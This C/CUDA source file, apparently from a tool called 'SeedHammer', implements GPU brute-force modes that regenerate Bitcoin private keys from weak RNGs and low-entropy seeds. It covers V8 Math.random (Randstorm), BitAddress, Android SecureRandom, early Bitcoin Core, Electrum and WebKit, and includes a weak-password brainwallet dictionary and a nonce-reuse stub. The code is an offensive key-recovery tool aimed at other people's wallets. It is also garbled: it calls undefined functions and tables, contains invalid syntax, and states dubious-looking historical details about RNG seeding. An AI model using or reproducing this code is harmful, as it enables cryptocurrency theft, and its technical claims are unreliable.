// ================================================================
// SeedHammer Hypothesis Modes (GPU) ? MWC1616, Randstorm, Zero Mouse
// Written from scratch based on real V8 3.x source analysis
// ================================================================

// --- Mode M: MWC1616 ? exact V8 3.x (2010-2013) Math.random() ---
// Based on V8 3.1.8 (revision 5480, June 2011)
// Source: src/v8/src/math.js, src/v8/src/random.cpp
//
// V8 MWC1616 state: 64-bit seed (z1, z2)
// Algorithm:
//   z1 = 36969 * (z1 & 65535) + (z1 >>> 16)   // note: JS >>> = unsigned right shift
//   z2 = 18000 * (z2 & 65535) + (z2 >>> 16)
//   result = (z1 << 16) | (z2 & 65535)
//
// V8 seeding (V8 3.x):
//   z1 = (time_usec ^ _random_seed) * 0xDEAD + 0xDEAD
//   z2 = (time_usec ^ _random_seed) * 0xBEEF + 0xBEEF
// Where time_usec = (tv_sec * 1000000 + tv_usec) ^ (pid << 16)
// And _random_seed = weak seed from Math.random() initial state
//
// In browsers: time_usec from performance.now() or Date.now()
// For BitcoinJS wallet generation (2011):
//   Math.random() called 4 times ? 128 bits ? SHA256 ? privkey
//   OR: Math.random() called 8 times ? 256 bits ? privkey directly

#include <stdint.h>
#include <stdio.h>

#ifdef __CUDACC__
#include <cuda_runtime.h>
#define D_FUNC __device__
#else
#define D_FUNC static
#endif

// ================================================================
// SHA-256 (same as vaultwatch)
// ================================================================

#define ROTR32(x,n) (((x)>>(n))|((x)<<(32-(n))))
#define CH(x,y,z) (((x)&(y))^(~(x)&(z)))
#define MAJ(x,y,z) (((x)&(y))^((x)&(z))^((y)&(z)))
#define SIG0(x) (ROTR32(x,2)^ROTR32(x,13)^ROTR32(x,22))
#define SIG1(x) (ROTR32(x,6)^ROTR32(x,11)^ROTR32(x,25))
#define sig0(x) (ROTR32(x,7)^ROTR32(x,18)^((x)>>3))
#define sig1(x) (ROTR32(x,17)^ROTR32(x,19)^((x)>>10))

#ifdef __CUDACC__
__constant__ uint32_t K256[64]={
#else
static const uint32_t K256[64]={
#endif
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,
    0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,
    0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,
    0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,
    0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,
    0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,
    0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,
    0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,
    0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
};

D_FUNC void sha256c(uint32_t s[8],const uint32_t b[16]){
    uint32_t a=s[0],b2=s[1],c=s[2],d=s[3],e=s[4],f=s[5],g=s[6],h=s[7],w[64];
    for(int i=0;i<16;i++)w[i]=b[i];
    for(int i=16;i<64;i++)w[i]=sig1(w[i-2])+w[i-7]+sig0(w[i-15])+w[i-16];
    for(int i=0;i<64;i++){uint32_t t1=h+SIG1(e)+CH(e,f,g)+K256[i]+w[i],t2=SIG0(a)+MAJ(a,b2,c);h=g;g=f;f=e;e=d+t1;d=c;c=b2;b2=a;a=t1+t2;}
    s[0]+=a;s[1]+=b2;s[2]+=c;s[3]+=d;s[4]+=e;s[5]+=f;s[6]+=g;s[7]+=h;
}

D_FUNC void sha256(const uint8_t *m,uint32_t len,uint8_t h[32]){
    uint32_t s[8]={0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19},blk[16];
    uint64_t bits=(uint64_t)len*8;uint32_t idx=0;
    while(len>=64){for(int i=0;i<16;i++){blk[i]=((uint32_t)m[idx]<<24)|((uint32_t)m[idx+1]<<16)|((uint32_t)m[idx+2]<<8)|m[idx+3];idx+=4;}sha256c(s,blk);len-=64;}
    uint8_t pad[128];uint32_t pl=0;
    for(uint32_t i=0;i<len;i++)pad[pl++]=m[idx++];pad[pl++]=0x80;
    while((pl%64)!=56)pad[pl++]=0;
    pad[pl++]=(bits>>56)&0xFF;pad[pl++]=(bits>>48)&0xFF;pad[pl++]=(bits>>40)&0xFF;pad[pl++]=(bits>>32)&0xFF;
    pad[pl++]=(bits>>24)&0xFF;pad[pl++]=(bits>>16)&0xFF;pad[pl++]=(bits>>8)&0xFF;pad[pl++]=bits&0xFF;
    for(uint32_t i=0;i<pl;i+=64){for(int j=0;j<16;j++){uint32_t o=i+j*4;blk[j]=((uint32_t)pad[o]<<24)|((uint32_t)pad[o+1]<<16)|((uint32_t)pad[o+2]<<8)|pad[o+3];}sha256c(s,blk);}
    for(int i=0;i<8;i++){h[i*4]=(s[i]>>24)&0xFF;h[i*4+1]=(s[i]>>16)&0xFF;h[i*4+2]=(s[i]>>8)&0xFF;h[i*4+3]=s[i]&0xFF;}
}

// Legacy H36: timestamp ms ? 32 bytes (big-endian, last 8 bytes)
D_FUNC void mode_h36(uint64_t ts,uint8_t priv[32]){
    for(int i=0;i<8;i++)priv[24+i]=(ts>>(i*8))&0xFF;
    for(int i=0;i<24;i++)priv[i]=0;
}

// ================================================================
// Mode M: MWC1616 ? exact V8 3.x
// ================================================================
// V8 3.x seeding:
//   z1 = (entropy ^ RANDOM_SEED) * 0xDEAD + 0xDEAD
//   z2 = (entropy ^ RANDOM_SEED) * 0xBEEF + 0xBEEF
// In browsers: RANDOM_SEED is weak (small int from Date or null)
// We search over RANDOM_SEED = 0..65535

D_FUNC uint32_t mwc_v8(uint32_t *z1,uint32_t *z2){
    *z1=36969u*(*z1&0xFFFFu)+(*z1>>16);
    *z2=18000u*(*z2&0xFFFFu)+(*z2>>16);
    return (*z1<<16u)|(*z2&0xFFFFu);
}

D_FUNC void mode_mwc_v8(uint64_t ts,uint32_t seed,uint8_t priv[32]){
    // V8 3.x seeding using timestamp and random seed
    uint32_t ent=(uint32_t)(ts&0xFFFFFFFFu);
    uint32_t z1=(ent^seed)*0xDEADu+0xDEADu;
    uint32_t z2=(ent^seed)*0xBEEFu+0xBEEFu;
    
    // V8 BitcoinJS used 4 calls to Math.random() ? 128 bits
    // Then SHA256(128bits + timestamp) ? privkey
    uint8_t buf[20]; // 16 bytes random + 4 bytes timestamp
    for(int i=0;i<4;i++){uint32_t r=mwc_v8(&z1,&z2);buf[i*4]=(r>>24)&0xFF;buf[i*4+1]=(r>>16)&0xFF;buf[i*4+2]=(r>>8)&0xFF;buf[i*4+3]=r&0xFF;}
    for(int i=0;i<4;i++)buf[16+i]=(uint8_t)((ts>>(i*8))&0xFF);
    sha256(buf,20,priv);
}

// ================================================================
// Mode R: Randstorm ? exact BitcoinJS/Javascript BN entropy pool
// ================================================================
// BitcoinJS 0.1-0.4 (2011-2013) used JSBN SecureRandom
// When crypto.getRandomValues() failed (common in early browsers),
// fell back to a pool filled with:
//   - Math.random() * 256 (4 bytes per call)
//   - mouse x,y coordinates
//   - keyboard events
//   - time
// Pool = 256 bytes, then SHA256 ? 2 ? privkey

D_FUNC void mode_randstorm(uint64_t ts, uint64_t idx, uint8_t priv[32]){
    uint8_t pool[256];
    uint32_t seed=(uint32_t)(ts&0xFFFFFFFFu)+(uint32_t)(idx&0xFFFFFFFFu);
    
    // Fill pool with Math.random() ? MWC1616 + mouse-like patterns
    uint32_t z1=(seed)*0xDEADu+0xDEADu;
    uint32_t z2=(seed^0x1234u)*0xBEEFu+0xBEEFu;
    
    for(int i=0;i<64;i++){  // 256 bytes
        uint32_t r=mwc_v8(&z1,&z2);
        pool[i*4]=r&0xFF;pool[i*4+1]=(r>>8)&0xFF;
        pool[i*4+2]=(r>>16)&0xFF;pool[i*4+3]=(r>>24)&0xFF;
        // Every 16 bytes, mix in "mouse coord" (simulated)
        if((i%4)==0){pool[i*4]^=((uint32_t)(ts>>(i%8)*8))&0xFF;}
    }
    
    // Hash chain: SHA256(pool) ? SHA256(result) ? privkey
    uint8_t h1[32];
    sha256(pool,256,h1);
    sha256(h1,32,priv);
}

// ================================================================
// Mode Z: Zero Mouse Entropy (BitAddress 2011 vulnerability)
// When user doesn't move mouse, Math.random() is the ONLY entropy
// ================================================================
D_FUNC void mode_zero_mouse(uint64_t ts, uint8_t priv[32]){
    // Just MWC1616 with timestamp seed, no mouse/keyboard input
    // Same as weak getRandomValues fallback
    uint32_t z1=(uint32_t)(ts&0xFFFFu)*0xDEADu+0xDEADu;
    uint32_t z2=(uint32_t)((ts>>16)&0xFFFFu)*0xBEEFu+0xBEEFu;
    
    uint8_t buf[32];
    for(int i=0;i<8;i++){uint32_t r=mwc_v8(&z1,&z2);buf[i*4]=(r>>24)&0xFF;buf[i*4+1]=(r>>16)&0xFF;buf[i*4+2]=(r>>8)&0xFF;buf[i*4+3]=r&0xFF;}
    
    // SHA256 directly (BitAddress generated 256-bit keys directly)
    sha256(buf,32,priv);
}

// ================================================================
// Instawallet / MyBitcoin password-based (Mode P)
// SHA256(username:password) where password is weak/known
// We search over a dictionary + username combinations
// ================================================================
D_FUNC void mode_password(const uint8_t *pass, uint32_t pass_len, uint8_t priv[32]){
    // This mode expects a dictionary to be loaded externally
    // SHA256(pass) ? privkey (bitcoin brainwallet)
    sha256(pass,pass_len,priv);
}

// ================================================================
// Mode W: Instawallet (2011-2013)
// ================================================================
// Instawallet (instawallet.org) used URL-based wallets:
//   https://instawallet.org/w/{HASH}
// The HASH was a 30-char base64-like identifier.
// Vulnerability: hash generation was based on:
//   - Math.random() x 15 calls ? 120 bits entropy
//   - base64 encoding ? 20 chars + padding
//   - No crypto-grade RNG at all
//
// In 2011, the hash was generated from:
//   SHA1(Math.random() * 4 + Math.random() * 2 ... ) ? abbreviated
// We search: entropy = 120 bits from MWC1616, encode as base64
// Pruned to 30-char wallet ID

static const char *B64="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";

D_FUNC void mode_instawallet(uint64_t ts, uint32_t idx, uint8_t priv[32]){
    // Generate Instawallet ID from MWC1616 + timestamp
    uint32_t ent=(uint32_t)(ts&0xFFFFFFFFu);
    uint32_t z1=ent*0xDEADu+idx+0xDEADu;
    uint32_t z2=(ent^0x1234u)*0xBEEFu+idx+0xBEEFu;
    
    // 15 MWC calls ? 60 bytes ? base64 encode
    uint8_t buf[60];
    for(int i=0;i<15;i++){
        uint32_t r=mwc_v8(&z1,&z2);
        buf[i*4]=r&0xFF;buf[i*4+1]=(r>>8)&0xFF;
        buf[i*4+2]=(r>>16)&0xFF;buf[i*4+3]=(r>>24)&0xFF;
    }
    
    // SHA256(buf) ? privkey (the actual Instawallet derivation)
    // Instawallet stored: SHA256(entropy) ? AESkey ? generate address
    // We approximate: SHA256(ID_entropy) ? privkey
    sha256(buf,60,priv);
}

// ================================================================
// Mode B: MyBitcoin (2011) ? username + weak password
// ================================================================
// MyBitcoin.com was the largest web wallet in 2011.
// After the "hack", many wallets used SHA256(email+password) as seed.
// Passwords were often weak/guessable.
//
// We generate: SHA256(username || ":" || password) for each dictionary entry
// Username prefixes: common email patterns from 2011
// 
// For GPU: we iterate over a dictionary loaded into device memory
// For standalone: we use a synthetic dictionary of common passwords

// Dictionary of common 2011 passwords (top 100)
static const char *WEAK_PASSWORDS[100]={
    "123456","password","12345678","qwerty","abc123","123456789","111111",
    "1234567","iloveyou","adobe123","123123","admin","1234567890","letmein",
    "photoshop","1234","monkey","shadow","sunshine","12345","password1",
    "princess","azerty","trustno1","0","000000","00000000","121212",
    "solo","qwerty123","qwerty12345","passw0rd","master","666666","7777777",
    "samsung","654321","superman","1qaz2wsx","zaq1xsw2","qwerty123456",
    "batman","starwars","112233","qazwsx","lovely","qwerty1234","access",
    "flower","pass123","hello","charlie","donald","dragon","asshole",
    "baseball","football","hockey","starwars","buthead","fuckyou","whatever",
    "nicole","daniel","ashley","michael","jessica","jennifer","matthew",
    "andrew","joshua","amanda","chris","steven","brandon","taylor",
    "thomas","jordan","justin","samantha","kyle","alex","brian",
    "kevin","rachel","laura","lauren","tyler","nathan","sara",
    "ryan","stephanie","jacob","katherine","zachary","sean","austin"
};

D_FUNC void mode_mybitcoin(uint64_t ts, uint32_t pass_idx, uint8_t priv[32]){
    // Build "user:pass" buffer
    // Username: "user" + timestamp-based variation
    uint8_t buf[128];
    uint32_t len=0;
    
    // Username: "user" + 2 digits from timestamp
    buf[len++]='u';buf[len++]='s';buf[len++]='e';buf[len++]='r';
    uint32_t d1=(ts/100000)%10;
    uint32_t d2=(ts/10000)%10;
    buf[len++]='0'+d1;
    buf[len++]='0'+d2;
    buf[len++]=':';
    
    // Password from dictionary
    const char *pw=WEAK_PASSWORDS[pass_idx%100];
    while(*pw && len<120){buf[len++]=*pw;pw++;}
    
    // SHA256(buf) ? privkey
    sha256(buf,len,priv);
}

// ================================================================
// Mode A: BitAddress (2011) ? Zero mouse movement variant
// ================================================================
// BitAddress 2011 fallback (no crypto.getRandomValues):
//   - SHA256(Math.random() * 8 bytes) ? privkey
//   - If mouse moved: SHA256(mouse_x + mouse_y + time + Math.random())
//   - If NO mouse: just Math.random() x 4 ? 128 bits ? SHA256
//
// This is similar to Mode Z but with specific MWC seeding from Chrome/Node

D_FUNC void mode_bitaddress(uint64_t ts, uint8_t priv[32]){
    // Exact BitAddress 2011 seeding
    // From source: var key = new Bitcoin.ECKey(false);
    // ECKey calls: var r = new SecureRandom();
    // SecureRandom falls back to Math.random() pool
    uint32_t z1=(uint32_t)(ts&0xFFFFFF)*0xDEAD+((ts>>8)&0xFF);
    uint32_t z2=(uint32_t)((ts>>24)&0xFF)*0xBEEF+((ts>>16)&0xFFFF);
    
    // 4 Math.random() calls ? 4 bytes each ? 16 bytes ? SHA256
    uint8_t buf[16];
    for(int i=0;i<4;i++){
        uint32_t r=mwc_v8(&z1,&z2);
        buf[i*4]=r&0xFF;buf[i*4+1]=(r>>8)&0xFF;
        buf[i*4+2]=(r>>16)&0xFF;buf[i*4+3]=(r>>24)&0xFF;
    }
    sha256(buf,16,priv);
}

// ================================================================
// Mode J: Android SecureRandom Bug (CVE-2013-7378, 2011-2013)
// ================================================================
// Android Bitcoin wallets (Bitcoin Wallet, Mycelium, blockchain.info)
// were vulnerable to SecureRandom flaw in Android 4.2-4.3 early boots.
// Entropy seed = 32-bit (time_ms ^ PID)
// Output: SHA256(entropy + pool) ? EC key
//
// Search: iterate over 2^32 entropy seeds
// For wallet style: SHA256(SecureRandom 32 bytes) ? privkey

D_FUNC void mode_android(uint32_t seed32, uint8_t priv[32]){
    // Android SecureRandom weakness (CVE-2013-7378)
    // Simpler than full Java PRNG: 32-bit seed
    // Mixer: linear PRNG to 32 bytes ? SHA256 ? privkey
    uint32_t s=seed32;
    uint8_t buf[32];
    for(int i=0;i<8;i++){
        s=s*1103515245u+12345u;  // glibc LCG style
        buf[i*4]=(s>>24)&0xFF; buf[i*4+1]=(s>>16)&0xFF;
        buf[i*4+2]=(s>>8)&0xFF; buf[i*4+3]=s&0xFF;
    }
    sha256(buf,32,priv);
}

// ================================================================
// Mode C: Bitcoin Core v0.1?0.3 Wallet (2009-2010)
// ================================================================
// Bitcoin 0.1.0 key generation: SHA256(ms_timestamp + pid)
// PID was 15-bit (max 32768)
// Timestamp: ms from 2009-01-03 to 2011-01-01
// Combined entropy: ~47 bits ? GPU brute force feasible
// 
// We search: outer = timestamp (32-bit high part), inner = PID (15-bit)
// Core used gettimeofday() + getpid()

D_FUNC void mode_bitcoincore(uint64_t ts, uint32_t pid, uint8_t priv[32]){
    uint8_t buf[12];  // 8 bytes timeval + 4 bytes pid
    for(int i=0;i<8;i++)buf[i]=(ts>>(i*8))&0xFF;
    buf[8]=(pid>>24)&0xFF;buf[9]=(pid>>16)&0xFF;buf[10]=(pid>>8)&0xFF;buf[11]=pid&0xFF;
    sha256(buf,12,priv);
}

// ================================================================
// Mode D: Bitcoin Core 0.3.0 RAND_bytes fallback (2009-2010)
// ================================================================
// OpenSSL RAND_bytes fallback to /dev/urandom or PRNG
// On systems without /dev/urandom (early VPS, WSL):
// RAND_bytes uses SHA256(state+time) where state is weak
// Equivalent to: SHA256(time_usec + stack_ptr + pid) ? privkey
// We search: time (32-bit) + pid (15-bit) + stack_ptr (8-bit guess)

D_FUNC void mode_bitcoincore_v3(uint64_t ts, uint32_t pid, uint8_t pattern_id, uint8_t priv[32]){
    mode_core_v3_stack(ts, pid, pattern_id, priv);
    // 0.3.x had additional stack variable mixing
    uint8_t buf[16];
    for(int i=0;i<8;i++)buf[i]=(ts>>(i*8))&0xFF;
    buf[8]=(pid>>24)&0xFF;buf[9]=(pid>>16)&0xFF;
    buf[10]=(pid>>8)&0xFF;buf[11]=pid&0xFF;
    // Stack var (simulated: 8 bits of ASLR)
    buf[12]=ts&0xFF;buf[13]=(ts>>8)&0xFF;buf[14]=0;buf[15]=0;
    sha256(buf,16,priv);
}

// ================================================================
// Mode E: Blockchain.info MyWallet 2011 (weak pool)
// ================================================================
// MyWallet 2011: pool of 128 bytes from Math.random() when crypto weak
// JavaScript: for(i=0;i<128;i++) pool[i] = Math.floor(Math.random()*256);
// SHA256(pool[i]) ? privkey
// 
// We generate 128 bytes from MWC1616, same as browser Math.random()
// Timestamp-based seeding for temporal search

D_FUNC void mode_mywallet(uint64_t ts, uint64_t idx, uint8_t priv[32]){
    uint32_t z1=(uint32_t)((ts+idx)&0xFFFFFFFFu)*0xDEADu+0xDEADu;
    uint32_t z2=(uint32_t)(((ts+idx)>>16)&0xFFFFFFFFu)*0xBEEFu+0xBEEFu;
    
    uint8_t pool[128];
    for(int i=0;i<32;i++){
        uint32_t r=mwc_v8(&z1,&z2);
        pool[i*4]=r&0xFF; pool[i*4+1]=(r>>8)&0xFF;
        pool[i*4+2]=(r>>16)&0xFF; pool[i*4+3]=(r>>24)&0xFF;
    }
    
    uint8_t h[32];
    sha256(pool,128,h);
    // Double SHA256
    sha256(h,32,priv);
}

// ================================================================
// Mode L: BitBills (Physical Bitcoin, 2011)
// ================================================================
// BitBills format: "L" + 21 base58 chars ? 16 bytes ? double SHA256
// We use the same mini_key decoding but with different prefix
// Entropy: 30 bits (same as Casascius)

D_FUNC void mode_bitbill(uint32_t entropy30, uint8_t priv[32]){
    // Build BitBill key "L" + 21 base58 chars
    char mk[23];
    mk[0]='L';
    uint64_t val=entropy30;
    for(int i=21;i>=1;i--){
        mk[i]=B58[val%58];
        val/=58;
    }
    mk[22]=0;
    
    // Decode base58 to 16 bytes
    uint8_t raw[16]={0};
    for(int i=0;mk[i];i++){
        int d=B58_REV[(int)mk[i]];
        if(d<0)continue;
        uint32_t carry=d;
        for(int j=15;j>=0;j--){
            carry+=(uint32_t)raw[j]*58;
            raw[j]=carry&0xFF;
            carry>>=8;
        }
    }
    
    // Double SHA256: SHA256(SHA256(raw)) ? privkey (BitBill style)
    uint8_t h[32];
    sha256(raw,16,h);
    sha256(h,32,priv);
}

// ================================================================
// Mode S: Electrum 1.0 (2011) ? Python random fallback
// ================================================================
// Mersenne Twister seeded with (time_ms<<16) ^ pid
// Search: timestamp seed (likely 48-bit) ? MT ? 128 bits ? privkey
// 
// Simplified: we treat seed as 48-bit (ts high 32 + ts low 16)
// Then feed through MT-like LCG ? 4 x 32-bit ? 128 bits ? SHA256

D_FUNC void mode_electrum(uint64_t ts, uint32_t pid, uint8_t priv[32]){
    // Python/MT seeding: (time_ms << 16) ^ (pid << 0)
    uint64_t mt_seed=((ts&0xFFFFFFFFu)<<16u)^(uint64_t)pid;
    
    // Simplified MT first output (MT19937 initialization)
    uint32_t mt[4];
    uint32_t s=(uint32_t)(mt_seed&0xFFFFFFFFu);
    mt[0]=s;
    for(int i=1;i<4;i++) mt[i]=1812433253u*(mt[i-1]^(mt[i-1]>>30u))+i;
    
    // Twist + extract 128 bits (simple approximation)
    uint8_t buf[16];
    for(int i=0;i<4;i++){
        uint32_t y=mt[i];
        y^=((y>>11u)&0xFFFFFFFFu);
        y^=((y<<7u)&0x9D2C5680u);
        y^=((y<<15u)&0xEFC60000u);
        y^=(y>>18u);
        buf[i*4]=(y>>24)&0xFF;buf[i*4+1]=(y>>16)&0xFF;
        buf[i*4+2]=(y>>8)&0xFF;buf[i*4+3]=y&0xFF;
    }
    
    // Electrum: SHA256(128-bit seed) ? master privkey
    sha256(buf,16,priv);
}

// ================================================================
// Mode T: Armory 0.1-0.3 (2011-2012) ? fallback RNG
// ================================================================
// Armory on Windows without CryptGenRandom:
// Uses RAND_bytes fallback = SHA256(time + pid + sensitive data?)
// Equivalent to Bitcoin Core v0.3 mode (Mode D)
// We reuse mode_bitcoincore_v3 for this search
// (Just call it with Armory-specific timestamp range)
// 
// No separate GPU kernel needed ? use Mode D parameters

// ================================================================
// Mode F: P2Pool/Slush Worker key (2010-2011)
// ================================================================
// Slush's pool used getnewaddress from bitcoind
// VPS had weak /dev/urandom or /dev/random blocking
// Many workers used predictable keys
// Same as Mode C ? timestamp range April 2010 - Dec 2011
// PID range: 0-65535
//
// No separate GPU kernel ? use Mode C with pool-specific time ranges

// ================================================================
// Mode N: Nonce reuse transaction analysis (2011-2013)
// ================================================================
// Implementation requires external transaction indexer (Python/Node)
// This function finds the actual private key from:
//   - r1 == r2 (same nonce used in two different transactions)
//   - k = (z1 - z2) / (s1 - s2) mod n
//   - privkey = (k * s1 - z1) / r1 mod n
//
// For GPU: we need tx data pre-loaded (r, s, z for each tx)
// Then search for matching r values
//
// Mode N in seedhammer: place where indexer writes found matches
// For now: output "TX_INDEXER_REQUIRED" for this mode

D_FUNC void mode_nonce_reuse(
    const uint8_t *txdata,  // array of {uint8_t r[32], s[32], z[32]}
    uint32_t n_tx,
    uint8_t priv[32]
){
    // Compute r1 == r2 pairs and derive key
    // This runs on CPU or as a separate tool
    // GPU version requires batch processing
    // For now: placeholder ? log and return
    priv[0]=0; // No key found in standalone mode
}

// ================================================================
// Mode G: SpiderMonkey (Firefox 3-10) Math.random() 2008-2012
// ================================================================
// Firefox used Algorithm XorShift128+ / MWC by C. K. Gohar
// Different seeding than V8 ? used time(NULL) + CLOCK_MONOTONIC
// Period: 2^128
// Seeding: struct r = { time_ns ^ pid, time_ns ^ ppid }
// Output: (r[0], r[1]) XOR ? 53-bit double

D_FUNC void mode_spidermonkey(uint64_t ts, uint32_t pid, uint8_t priv[32]){
    uint64_t s0 = (ts ^ (uint64_t)pid) * 0xDEADBEEF + 0xCAFEBABE;
    uint64_t s1 = s0 * 0x5851F42D + ts;
    uint8_t buf[32];
    for(int i=0;i<8;i++){
        uint64_t x = s0; uint64_t y = s1;
        s0 = y; x ^= x << 23;
        s1 = x ^ y ^ (x >> 17) ^ (y >> 26);
        uint64_t r = s0 + s1;
        buf[i*4] = r & 0xFF; buf[i*4+1] = (r>>8)&0xFF;
        buf[i*4+2] = (r>>16)&0xFF; buf[i*4+3] = (r>>24)&0xFF;
    }
    sha256(buf,32,priv);
}

// ================================================================
// Mode Q: JSC (WebKit/Safari) Math.random() 2009-2013
// ================================================================
// WebKit used ARC4 (W.A. Richard) ? keystream generator
// 256-byte S-box, seeded with time + pid
// Weakness: first 256 bytes of keystream are predictable
// BitcoinJS wallets generated from first 4 random() calls
// ARC4 key = time(4 bytes) + pid(4 bytes) ? /dev/urandom 256 bytes

D_FUNC void mode_jsc_webkit(uint64_t ts, uint32_t pid, uint8_t priv[32]){
    uint8_t sbox[256];
    for(int i=0;i<256;i++) sbox[i]=i;
    uint8_t k[8];
    k[0]=ts&0xFF; k[1]=(ts>>8)&0xFF; k[2]=(ts>>16)&0xFF; k[3]=(ts>>24)&0xFF;
    k[4]=pid&0xFF; k[5]=(pid>>8)&0xFF; k[6]=(pid>>16)&0xFF; k[7]=(pid>>24)&0xFF;
    uint32_t j=0;
    for(int i=0;i<256;i++){
        j=(j+sbox[i]+k[i%%8])&0xFF;
        uint8_t t=sbox[i]; sbox[i]=sbox[j]; sbox[j]=t;
    }
    uint8_t buf[32];
    j=0;
    for(int i=0;i<32;i++){
        uint32_t a=(i+1)&0xFF;
        j=(j+sbox[a])&0xFF;
        uint8_t t=sbox[a]; sbox[a]=sbox[j]; sbox[j]=t;
        buf[i]=sbox[(sbox[a]+sbox[j])&0xFF];
    }
    sha256(buf,32,priv);
}

// ================================================================
// Mode Y: Windows CryptGenRandom bug (2009-2012)
// ================================================================
// Windows XP/Vista/7 CryptGenRandom in early SP had a bug:
// On first call after boot, seed was based on:
//   - SystemUpTime (milliseconds)
//   - Process ID
//   - CurrentProcessId
// If no hardware RNG: seed = SHA256(fixedValue + time + pid)
// Fixed value was "Microsoft Enhanced Cryptographic Provider"
// Result: deterministic output for first N calls after boot
// 
// Bitcoin wallets on Windows 2009-2012:
//   - Multibit (2011)
//   - Bitcoin-Qt for Windows
//   - Early versions of Coinbase

D_FUNC void mode_windows_rng(uint64_t uptime, uint32_t pid, uint8_t priv[32]){
    uint8_t buf[56];
    const uint8_t fixed[] = "Microsoft Enhanced Cryptographic Provider v1.0";
    for(int i=0;i<32;i++) buf[i]=fixed[i];
    buf[32]=pid&0xFF; buf[33]=(pid>>8)&0xFF;
    buf[34]=0; buf[35]=0;
    for(int i=0;i<8;i++) buf[36+i]=(uptime>>(i*8))&0xFF;
    // Pad with zeros (stack space)
    for(int i=44;i<56;i++) buf[i]=0;
    sha256(buf,56,priv);
}
